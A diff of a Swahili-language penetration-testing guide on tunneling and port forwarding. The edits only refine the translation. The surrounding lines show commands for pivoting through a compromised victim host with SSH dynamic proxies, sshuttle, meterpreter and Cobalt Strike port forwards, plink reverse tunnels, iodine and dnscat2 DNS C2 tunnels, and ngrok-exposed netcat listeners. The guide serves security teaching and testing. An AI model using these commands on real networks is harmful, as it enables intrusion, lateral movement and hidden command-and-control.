@@ -5,7 +5,7 @@
 ## Nmap tip
 
 > [!WARNING]
-> **ICMP** na **SYN** skani haziwezekani kupitishwa kupitia socks proxies, hivyo lazima **tuondoe kugundua ping** (`-Pn`) na kubainisha **TCP skani** (`-sT`) ili hii ifanye kazi.
+> **ICMP** na **SYN** skani haziwezekani kupitishwa kupitia socks proxies, hivyo lazima **tuondoe kugundua ping** (`-Pn`) na kubaini **TCP skani** (`-sT`) ili hii ifanye kazi.
 
 ## **Bash**
 
@@ -51,7 +51,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Porti za ndani --> Kituo kilichovunjwa (SSH) --> Popote
+Porti za ndani --> Kihosti kilichoshambuliwa (SSH) --> Popote
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -95,7 +95,7 @@ Kwa mfano, kupeleka kila traffic inayokwenda 10.10.10.0/24
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
 ```
-Unganisha na ufunguo wa kibinafsi
+Connect na ufunguo wa kibinafsi
 ```bash
 sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 # -D : Daemon mode
@@ -104,7 +104,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Local port --> Compromised host (active session) --> Third_box:Port
+Porti za ndani --> Kituo kilichovunjwa (kipindi kinachofanya kazi) --> Sanduku_tatu:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -145,7 +145,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> Katika kesi hii, **bandari imefunguliwa kwenye mwenyeji wa beacon**, sio kwenye Team Server na trafiki inatumwa kwa Team Server na kutoka hapo kwa mwenyeji:bandari iliyoonyeshwa.
+> Katika kesi hii, **bandari imefunguliwa katika mwenyeji wa beacon**, si katika Team Server na trafiki inatumwa kwa Team Server na kutoka hapo kwa mwenyeji:bandari iliyoonyeshwa.
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
@@ -154,12 +154,12 @@ Ili kuzingatia:
 
 - Reverse port forward ya Beacon imeundwa ili **kufanya tunnel trafiki kwa Team Server, sio kwa kuhamasisha kati ya mashine binafsi**.
 - Trafiki **inafanywa tunnel ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
-- **Haki za Admin hazihitajiki** kuunda reverse port forwards kwenye bandari za juu.
+- **Haki za admin hazihitajiki** kuunda reverse port forwards kwenye bandari za juu.
 
 ### rPort2Port local
 
 > [!WARNING]
-> Katika kesi hii, **bandari imefunguliwa kwenye mwenyeji wa beacon**, sio kwenye Team Server na **trafiki inatumwa kwa mteja wa Cobalt Strike** (sio kwa Team Server) na kutoka hapo kwa mwenyeji:bandari iliyoonyeshwa.
+> Katika kesi hii, **bandari imefunguliwa katika mwenyeji wa beacon**, sio katika Team Server na **trafiki inatumwa kwa mteja wa Cobalt Strike** (sio kwa Team Server) na kutoka hapo kwa mwenyeji:bandari iliyoonyeshwa.
 ```
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -219,7 +219,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Ufunguo wa Wakala na Kusikiliza
+### Agent Binding and Listening
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -320,7 +320,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Ni kama toleo la console la PuTTY (chaguzi ni sawa na mteja wa ssh).
 
-Kwa kuwa hii binary itatekelezwa kwenye mwathirika na ni mteja wa ssh, tunahitaji kufungua huduma yetu ya ssh na bandari ili tuweze kuwa na muunganisho wa kurudi. Kisha, ili kupeleka tu bandari inayoweza kufikiwa ndani kwenye bandari kwenye mashine yetu:
+Kwa kuwa hii binary itatekelezwa kwenye mwathirika na ni mteja wa ssh, tunahitaji kufungua huduma yetu ya ssh na bandari ili tuweze kuwa na muunganisho wa kurudi. Kisha, ili kupeleka tu bandari inayoweza kufikiwa ndani kwa bandari kwenye mashine yetu:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -366,7 +366,7 @@ Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) **kupanua trafi
 
 ## Proxify Windows GUI Apps
 
-Unaweza kufanya programu za Windows GUI zipitie proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
+Unaweza kufanya programu za Windows GUI zipitie kupitia proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
 Katika **Profile -> Proxy Servers** ongeza IP na bandari ya seva ya SOCKS.\
 Katika **Profile -> Proxification Rules** ongeza jina la programu ya kupanua na muunganisho kwa IP unazotaka kupanua.
 
@@ -390,12 +390,12 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Sasa, ikiwa utaweka kwa mfano katika mwathirika huduma ya **SSH** kusikiliza kwenye bandari 443. Unaweza kuungana nayo kupitia bandari ya mshambuliaji 2222.\
+Sasa, ikiwa unakamilisha kwa mfano katika mwathirika huduma ya **SSH** kusikiliza kwenye bandari 443. Unaweza kuungana nayo kupitia bandari ya mshambuliaji 2222.\
 Unaweza pia kutumia **meterpreter** inayounganisha na localhost:443 na mshambuliaji anasikiliza kwenye bandari 2222.
 
 ## YARP
 
-Kipindi cha nyuma kilichoundwa na Microsoft. Unaweza kukipata hapa: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+Kipindi cha kurudi kilichoundwa na Microsoft. Unaweza kukipata hapa: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNS Tunneling
 
@@ -403,7 +403,7 @@ Kipindi cha nyuma kilichoundwa na Microsoft. Unaweza kukipata hapa: [https://git
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root inahitajika katika mifumo yote ili kuunda tun adapters na kupitisha data kati yao kwa kutumia maswali ya DNS.
+Root inahitajika katika mifumo yote miwili ili kuunda tun adapters na kupitisha data kati yao kwa kutumia maswali ya DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -415,9 +415,9 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
 ### DNSCat2
 
-[**Download it from here**](https://github.com/iagox86/dnscat2)**.**
+[**Pakua kutoka hapa**](https://github.com/iagox86/dnscat2)**.**
 
-Inaunda channel ya C\&C kupitia DNS. Haihitaji ruhusa za mzizi.
+Inaunda channel ya C\&C kupitia DNS. Haihitaji ruhusa za root.
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -478,11 +478,11 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **ni chombo cha kufichua suluhisho kwa Mtandao kwa amri moja tu.**\
-_&#x45;xposition URI ni kama:_ **UID.ngrok.io**
+_Exposition URI ni kama:_ **UID.ngrok.io**
 
 ### Installation
 
-- Unda akaunti: https://ngrok.com/signup
+- Tengeneza akaunti: https://ngrok.com/signup
 - Pakua mteja:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
@@ -504,7 +504,7 @@ _Pia inawezekana kuongeza uthibitisho na TLS, ikiwa ni lazima._
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### Kuonyesha faili kwa kutumia HTTP
+#### Kuweka wazi faili kwa HTTP
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
